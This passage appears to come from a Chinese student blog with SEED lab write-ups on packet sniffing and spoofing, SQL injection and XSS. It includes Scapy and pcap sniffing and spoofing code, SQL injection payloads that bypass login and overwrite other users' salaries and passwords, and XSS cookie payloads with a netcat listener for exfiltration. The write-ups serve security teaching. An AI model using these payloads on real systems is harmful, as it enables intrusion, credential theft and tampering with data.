class="hljs-number">5</span>):<br>    send(ip/icmp)<br></code></pre></td></tr></table></figure><ol start="2"><li>可以看到，wiresahrk成功监听到5个ICMP echo数据包，说明伪造的数据包也可以被成功发送。</li></ol><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.12.jpg" class=""><h3 id="Task-1-3-Traceroute">Task 1.3: Traceroute</h3><p>sr 函数是 Scapy 的核心，这个函数返回两个列表，第一个列表是收到应答的包和其对应的应答，第二个列表是未收到应答的包。我们设置ttl为从1到30，则可以通过sr函数接收到返回的一系列数据包，<a href="http://xn--www-c88dj92gtwh1n0aiyar37cte2a.baidu.com">所设置的目标为www.baidu.com</a>。trace.py程序如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>dst=<span class="hljs-string">&quot;baidu.com&quot;</span><br>dport=<span class="hljs-number">80</span><br>minttl=<span class="hljs-number">1</span><br>maxttl=<span class="hljs-number">30</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dst:&#123;&#125;,port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(dst,dport))<br>ans,unans=sr(IP(dst=dst,ttl=(minttl,maxttl),<span class="hljs-built_in">id</span>=RandShort())/TCP(flags=<span class="hljs-number">0x2</span>,dport=dport),timeout=<span class="hljs-number">10</span>)<br><br><span class="hljs-keyword">for</span> snd,rcv <span class="hljs-keyword">in</span> ans:<br>    <span class="hljs-built_in">print</span>(snd.ttl,rcv.src)<br></code></pre></td></tr></table></figure><p>通过ping查看百度ip，为39.156.66.10，两次运行程序都是只需要两跳就可以到达，但是接收到的数据包数量会有所不同。</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.20.jpg" class=""><h3 id="Task-1-4-Sniffifing-and-then-Spoofifing">Task 1.4: Sniffifing and-then Spoofifing</h3><p>1、主机1.2.3.4是Internet中不存在的主机，10.9.0.99是LAN中不存在的主机，8.8.8.8是Internet中存在的主机。首先让host A（10.9.0.5）ping这三台主机，情况如下图所示，可以看到，只有第3台主机可以ping通。</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.21.jpg" class=""><p>2、接着编写嗅探程序，捕获来自host A的ICMP数据包，重新构造ICMP数据包，使源IP和目标IP互换：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-keyword">if</span> ICMP <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-number">8</span> == pkt[ICMP].<span class="hljs-built_in">type</span>:<br>        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)<br>        ip.ihl = pkt[IP].ihl<br>        ip.ttl = <span class="hljs-number">99</span><br>        icmp = ICMP(<span class="hljs-built_in">type</span> = <span class="hljs-number">0</span>)<br>        icmp.<span class="hljs-built_in">id</span> = pkt[ICMP].<span class="hljs-built_in">id</span><br>        icmp.seq = pkt[ICMP].seq<br>        data = pkt[Raw].load<br>        send(ip/icmp/data, verbose=<span class="hljs-literal">False</span>)<br>sniff(iface = <span class="hljs-string">&#x27;br-bff5c8d16447&#x27;</span>, <span class="hljs-built_in">filter</span> = <span class="hljs-string">&#x27;icmp and ip src 10.9.0.5&#x27;</span>, prn = spoof)<br></code></pre></td></tr></table></figure><p>3、运行嗅探程序，再次让host A ping三台主机，结果如下：</p><p>（1）ping 1.2.3.4 ，发现后相应的数据包，通过ttl值可以说明host A收到的是我们伪造的ICMP数据包。</p><p>（2）ping 10.9.0.99，仍然没有收到伪造的ICMP数据包，因为和1.2.3.4不同的是，10.9.0.99与host A处于同一局域网中，HostA会先广播ARP请求询问10.9.0.99的MAC地址，之后才会发送ICMP请求，由于10.9.0.99不存在，因此不会收到ARP回复，也就不会发送ICMP，所以嗅探程序没有捕获到ICMP数据包。</p><p>（3）ping 8.8.8.8，通过ttl的差异可以说明host A既收到了真实的ICMP，也收到了伪造的ICMP，“DUP”说明有数据包重复。</p><h2 id="Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets">Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h2><h3 id="Task-2-1A-Understanding-How-a-Sniffer-Works">Task 2.1A: Understanding How a Sniffer Works</h3><p>1、编写嗅探程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pcap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">/* This function will be invoked by pcap for each captured packet.</span><br><span class="hljs-comment">We can process each packet inside the function.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Ether_head</span>&#123;</span><br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">6</span>];<br>    <span class="hljs-type">char</span> scr[<span class="hljs-number">6</span>];<br>    <span class="hljs-type">short</span> type;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IP_head</span>&#123;</span><br>    <span class="hljs-comment">/* data */</span><br>    <span class="hljs-type">char</span> version:<span class="hljs-number">4</span>,head_len:<span class="hljs-number">4</span>;<br>    <span class="hljs-type">char</span> service_type;<br>    <span class="hljs-type">short</span> pkt_length;<br>    <span class="hljs-type">short</span> identification;<br>    <span class="hljs-type">short</span> flag:<span class="hljs-number">3</span>;<br>    <span class="hljs-type">short</span> offset:<span class="hljs-number">13</span>;<br>    <span class="hljs-type">char</span> TTL;<br>    <span class="hljs-type">char</span> protocol;<br>    <span class="hljs-type">short</span> check_sum;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">src_ip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">dst_ip</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">got_packet</span><span class="hljs-params">(u_char *args, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pcap_pkthdr *header,</span><br><span class="hljs-params">                <span class="hljs-type">const</span> u_char *packet)</span><br>&#123;<br>    <span class="hljs-comment">// printf(&quot;Got a packet\n&quot;);</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Ether_head</span> * <span class="hljs-title">E_head</span>=</span>(<span class="hljs-keyword">struct</span> Ether_head*)packet;<br>    <span class="hljs-keyword">if</span>(ntohs(E_head-&gt;type)==<span class="hljs-number">0x0800</span>)&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IP_head</span> * <span class="hljs-title">ip</span>=</span>(<span class="hljs-keyword">struct</span> IP_head*)(packet+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Ether_head));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;src_IP:%s\n&quot;</span>,inet_ntoa(ip-&gt;src_ip));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dst_IP:%s\n&quot;</span>,inet_ntoa(ip-&gt;dst_ip));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pcap_t</span> *handle;<br>    <span class="hljs-type">char</span> errbuf[PCAP_ERRBUF_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_program</span> <span class="hljs-title">fp</span>;</span><br>    <span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;icmp&quot;</span>;<br>    bpf_u_int32 net;<br>    <span class="hljs-comment">// Step 1: Open live pcap session on NIC with name eth3.</span><br>    <span class="hljs-comment">// Students need to change &quot;eth3&quot; to the name found on their own</span><br>    <span class="hljs-comment">// machines (using ifconfig). The interface to the 10.9.0.0/24</span><br>    <span class="hljs-comment">// network has a prefix &quot;br-&quot; (if the container setup is used).</span><br>    handle = pcap_open_live(<span class="hljs-string">&quot;br-bff5c8d16447&quot;</span>, BUFSIZ, <span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, errbuf);<br>    <span class="hljs-comment">// Step 2: Compile filter_exp into BPF psuedo-code</span><br>    pcap_compile(handle, &amp;fp, filter_exp, <span class="hljs-number">0</span>, net);<br>    <span class="hljs-keyword">if</span> (pcap_setfilter(handle, &amp;fp) != <span class="hljs-number">0</span>)<br>    &#123;<br>        pcap_perror(handle, <span class="hljs-string">&quot;Error:&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-comment">// Step 3: Capture packets</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sniff packets...\n&quot;</span>);<br>    pcap_loop(handle, <span class="hljs-number">-1</span>, got_packet, <span class="hljs-literal">NULL</span>);<br>    pcap_close(handle); <span class="hljs-comment">// Close the handle</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>2、编译运行嗅探程序<code>gcc -o task2.1 task2.1.c -l pcap</code>、<code>sudo ./task2.1</code></p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.25.jpg" class=""><p>3、在host A中ping host B：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.26.jpg" class=""><p>4、在嗅探程序中得到结果：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.27.jpg" class=""><p><strong>Question 1.</strong> Please use your own words to describe the sequence of the library calls that are essentialfor sniffer programs. This is meant to be a summary, not detailed explanation like the one in thetutorial or book.</p><p>首先定义好解析数据包的结构体和解析函数，然后在主函数中首先调用<code>pcap_open_live</code>打开设备文件准备读取数据，也就是要启动pcap监听网卡，然后用<code>pcap_compile</code>编译过滤规则，接着<code>pcap_setfilter</code>函数用于定义过滤规则，也就是要过滤出ICMP包，接着<code>pcap_loop</code>循环抓取数据包，并交给解析函数进行解析，最后使用<code>pcap_close</code>关闭库。</p><p><strong>Question 2.</strong> Why do you need the root privilege to run a sniffer program? Where does the programfail if it is executed without the root privilege?</p><p>启动嗅探程序需要root权限，普通用户下运行程序会提示&quot;权限不足&quot;，无法运行。因为嗅探数据包涉及用户数据安全，因此需要有高权限才能执行。</p><p><strong>Question 3.</strong> Please turn on and turn off the promiscuous mode in your sniffer program. The value1 of the third parameter in pcap open live() turns on the promiscuous mode (use 0 to turn itoff). Can you demonstrate the difference when this mode is on and off? Please describe how you candemonstrate this. You can use the following command to check whether an interface’s promiscuousmode is on or off (look at the promiscuity’s value).</p><p>混杂模式下可以监听到相同网段下的其他数据包。</p><h3 id="Task-2-1B-Writing-Filters">Task 2.1B: Writing Filters.</h3><p><strong>Capture the ICMP packets between two specifific hosts.</strong></p><p>修改过滤规则，使嗅探程序只捕获host A 到 host B的数据包</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;icmp and src host 10.9.0.5 and dst host 10.9.0.6&quot;</span>;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.28.jpg" class=""><p><strong>Capture the TCP packets with a destination port number in the range from 10 to 100.</strong></p><p>1、设置过滤规则，捕获目标端口号在10到100范围内的TCP数据包。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> filter_exp[] = <span class="hljs-string">&quot;TCP and dst portrange 10-100&quot;</span>;<br></code></pre></td></tr></table></figure><p>2、查看host B的端口开放情况并开启host B的8080端口。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 开启8080端口</span><br>netstat -an<span class="hljs-string">|grep 8080</span><br>nc -lp <span class="hljs-number">8080</span><span class="hljs-meta">&amp;</span><br><br><span class="hljs-meta"># 查看端口开放情况</span><br>netstat -ltn<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.29.jpg" class=""><p>3、host A访问host B的8080端口，host B访问hostA的23端口，返回侦听程序查看结果，只有访问23端口的数据包被侦听到。</p><p>（1）10.9.0.5（A）访问10.9.0.6（B）的8080端口：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.31.jpg" class=""><p>（2）10.9.0.6访问10.9.0.5的23端口：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.32.jpg" class=""><p>（3）侦听结果：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.33.jpg" class=""><h3 id="Task-2-1C-Sniffifing-Passwords">Task 2.1C: Sniffifing Passwords</h3><p>使用telnet进行远程连接时存在的一个问题是，telnet使用铭文进行数据传输，则一旦数据包被捕获，重要的数据就完全暴露给攻击者。</p><p>1、监听代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_pkt</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># pkt.show()</span><br>    <span class="hljs-built_in">print</span>(pkt.payload.payload.payload)<br><br><span class="hljs-built_in">print</span>(sniff(iface = <span class="hljs-string">&#x27;br-bff5c8d16447&#x27;</span>,<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;tcp port 23&quot;</span>, prn=print_pkt))<br></code></pre></td></tr></table></figure><p>2、host A远程登录host B：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.35.jpg" class=""><p>3、攻击者得到密码：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.34.jpg" class=""><h3 id="Task-2-2A-Write-a-spoofifing-program">Task 2.2A: Write a spoofifing program.</h3><p>（1）采用原始套接字编程的方式构造数据包，首先定义好IP头、TCP头、UDP头、ICMP头的结构体，还需要对定义计算校验和的函数。在构造数据包时关键是定义好源IP和目标IP，并且填充其余各个字段。伪造一个UDP/IP数据包，并且指定源IP和目标IP分别为1.1.1.1、8.8.8.8：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.39.jpg" class=""><p>（2）通过wireshark查看结果：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.36.jpg" class=""><h3 id="Task-2-2B-Spoof-an-ICMP-Echo-Request">Task 2.2B: Spoof an ICMP Echo Request.</h3><p>（1）构造ICMP数据包的过程和上一题相似，这里设定源IP和目标IP分别为1.2.3.4、8.8.8.8的ICMP数据包：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.38.jpg" class=""><p>（2）通过wireshark查看结果：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.40.jpg" class=""><p><strong>Question 4.</strong> Can you set the IP packet length fifield to an arbitrary value, regardless of how big the actual packet is?</p><p>数据包的长度可以设定为大于实际长度的值，但是不能设为小于实际长度的值。</p><p><strong>Question 5.</strong> Using the raw socket programming, do you have to calculate the checksum for the IP header?</p><p>采用原始套接字编程时，不需要计算IP头部的校验和，但是需要计算ICMP头部的校验和。</p><p><strong>Question 6.</strong> Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?</p><p>原始套接字可以允许用户定制数据包，这意味着存在这较大的安全隐患，因此普通用户没有权限使用原始套接字。</p><h3 id="Task-2-3-Sniff-and-then-Spoof">Task 2.3: Sniff and then Spoof</h3><p>攻击主机运行task2.3，使host A ping另一台主机时所收到的ICMP响应包是攻击者所伪造的。</p><p>（1）host A：ping 1.1.1.1：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.42.jpg" class=""><p>（2）seed-attacker发送源IP为1.1.1.1，目标IP为host A IP的ICMP数据包：</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.41.jpg" class=""><h1>遇到的问题</h1><p>docker-compose down<br>docker network ls<br>docker network rm 10682b5c2c9d</p><p>docker network disconnect -f net-10.9.0.0 mysql-10.9.0.6</p><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.14.jpg" class=""><img src="/2024/02/20/Lab9_%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/9.15.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab8-SQL注入</title>
    <link href="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1>Task 1: Get Familiar with SQL Statements</h1><ol><li><p>找到数据库容器的id：dockps，启动shell：docksh eee</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105181058074.png" class=""></li><li><p>根据实验手册的提示，使用数据库sqllab_users：use sqllab_users；查看表名：show tables；查看数据库表的基本信息，得到列名：desc credential。</p><p>使用数据库sqllab_users：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105181108205.png" class=""><p>查看表的信息：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105181138367.png" class=""></li><li><p>查看用户Alice的信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> credential <span class="hljs-keyword">where</span> <span class="hljs-type">Name</span>=<span class="hljs-string">&#x27;Alice&#x27;</span>;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184238436.png" class=""></li></ol><h1>Task 2: SQL Injection Attack on SELECT Statement</h1><h2 id="Task-2-1-SQL-Injection-Attack-from-webpage">Task 2.1: SQL Injection Attack from webpage.</h2><p>在不知道密码的情况下以admin的身份登录，根据提示的源码来看，sql语句只实现了简单的拼接，所以构造payload如下，实现无密码登录：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">Admin</span>’<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184320804.png" class=""><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184327895.png" class=""><h2 id="Task-2-2-SQL-Injection-Attack-from-command-line">Task 2.2: SQL Injection Attack from command line.</h2><p>与上一实验类似，只是这次需要在url中实现注入，需要注意url编码问题，payload如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span>www.seed-server.com/unsafe_home.php?username=admin%27%23<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184410198.png" class=""><h2 id="Task-2-3-Append-a-new-SQL-statement">Task 2.3: Append a new SQL statement.</h2><p>尝试实现两条sql语句注入，但是发现无法成功执行，从报错结果来看，后端采用的是query()函数，一次只能执行一条sql语句，因此出现了语法错误，执行失败。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">www.seed-server.com/unsafe_home.php?<span class="hljs-attribute">username</span>=admin&#x27;;update credential <span class="hljs-built_in">set</span> <span class="hljs-attribute">salary</span>=0 where <span class="hljs-attribute">Name</span>=<span class="hljs-string">&#x27;Alice&#x27;</span>;%23<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184530428.png" class=""><h1>Task 3: SQL Injection Attack on UPDATE Statement</h1><h2 id="Task-3-1-Modify-your-own-salary">Task 3.1: Modify your own salary.</h2><p>首先以Alice的身份登录，进入修改页面，在表单输入sql注入语句，实现对Salary字段的修改。</p><p>更新Salary为100000：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184530428.png" class=""><p>返回Alice主页，发现Salary被修改为指定值：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105184539962.png" class=""><h2 id="Task-3-2-Modify-other-people’-salary">Task 3.2: Modify other people’ salary.</h2><p>想要修改其他人的Salary字段，只要在原来的基础上添加修改条件即可。数据库中Boby对应的ID为2，所以添加条件：where ID=2#，或者where Name=‘Boby’#。</p><p>添加修改条件：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105195950595.png" class=""><p>利用admin的身份登录，发现Boby的相关信息已经被修改：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105200004386.png" class=""><h2 id="Task-3-3-Modify-other-people’-password">Task 3.3: Modify other people’ password.</h2><p>根据源码提示，用户的密码经过sha1加密，所以首先需要将我们想要改的密码经过sha1加密。本实验中想要把Boby的密码改为“123456”，所以首先在在线加密平台对其进行加密：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105210642565.png" class=""><p>然后用同样的方法修改利用Alice的身份对Boby的密码进行修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span><span class="hljs-string">&#x27;,Password=&#x27;</span>7c4a8d09ca3762af61e59520943dc26494f8941b<span class="hljs-string">&#x27; where Name=&#x27;</span>Boby<span class="hljs-string">&#x27;;#</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105220529205.png" class=""><p>在数据库中查询，可以看到Boby的密码已经被修改为对应的hash值，在登录页面中使用新密码成功登录。</p><p>原密码hash值：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105220603119.png" class=""><p>新密码hash值：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105220607247.png" class=""><p>使用新密码登录：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105220617535.png" class=""><h1>Task 4: Countermeasure — Prepared Statement</h1><p>采用预编译的手段来修改源代码，来抵御上述的SQL注入。首先在defense文件夹下修改unsafe.php文件，将sql查询语句进行如下修改：</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105221222416.png" class=""><p>接着重启容器：dcbuild、dcup，再次使用Task1的方法，发现返回的页面为空，即无法实现SQL注入。</p><img src="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/image-20230105221236840.png" class="">]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab7-XSS攻击</title>
    <link href="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/"/>
    <url>/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1>Task 1: Posting a Malicious Message to Display an Alert Window</h1><ol><li><p>以普通用户的身份登录，在个人简介的“Brief description”处插入script代码，然后保存：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(“xss”);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175436492.png" class=""></li><li><p>返回个人主页，js代码被成功执行，出现弹窗。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175444963.png" class=""></li></ol><h1>Task 2: Posting a Malicious Message to Display Cookies</h1><ol><li><p>与task1类似，但是这次要获取的是cookie，因此修改插入的代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175525122.png" class=""></li><li><p>返回主页，在弹窗中拿到cookie。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175544555.png" class=""></li></ol><h1>Task 3: Stealing Cookies from the Victim’s Machine</h1><p>task3实现了将获取的信息发送给指定主机的功能。</p><ol><li><p>使用nc命令监听实验提供的主机，其中“lk”指持续监听，“nv”可以获取到更加详细的信息。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lknv <span class="hljs-number">10.9.0.1</span> <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure></li><li><p>修改代码,在代码中使用&lt;img&gt;标签，当代码被触发执行时会尝试从src指定的路径中请求资源，后面再拼接上想要获取的cookie信息，则信息会根据src中指定的url和端口号将信息发送给攻击者指定的主机。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175759612.png" class=""></li><li><p>返回监听窗口，获取到了cookie。</p><img 